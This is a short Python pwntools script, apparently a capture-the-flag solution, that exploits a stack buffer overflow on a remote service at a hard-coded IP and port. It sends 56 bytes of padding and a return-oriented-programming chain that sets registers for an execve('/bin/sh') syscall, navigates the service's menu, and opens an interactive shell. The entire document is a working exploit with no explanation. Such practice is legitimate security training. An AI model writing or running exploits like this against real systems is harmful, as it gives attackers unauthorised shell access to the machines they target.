from pwn import *

HOST = "154.57.164.74"
PORT = 32436

def main() -> None:
    p = remote(HOST, PORT)

    payload = b"A" * 56
    payload += p64(0x00402BD8)  # pop rdi ; pop rbp ; ret
    payload += p64(0x00481778)  # "/bin/sh"
    payload += p64(0x0)         # filler for rbp

    payload += p64(0x0040C002)  # pop rsi ; pop rbp ; ret
    payload += p64(0x0) * 2     # rsi = 0, filler for rbp

    payload += p64(0x0046F4DC)  # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
    payload += p64(0x0) * 5     # rdx = 0, fillers for rbx/r12/r13/rbp

    payload += p64(0x0042ADAB)  # pop rax ; ret
    payload += p64(59)          # sys_execve

    payload += p64(0x0040141A)  # syscall

    p.recvuntil(b">")
    p.sendline(b"1")

    p.recvuntil(b">")
    p.sendline(b"1")

    p.recvuntil(b"(y/n):")
    p.sendline(b"y")

    p.recvuntil(b"buffer:")
    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    main()
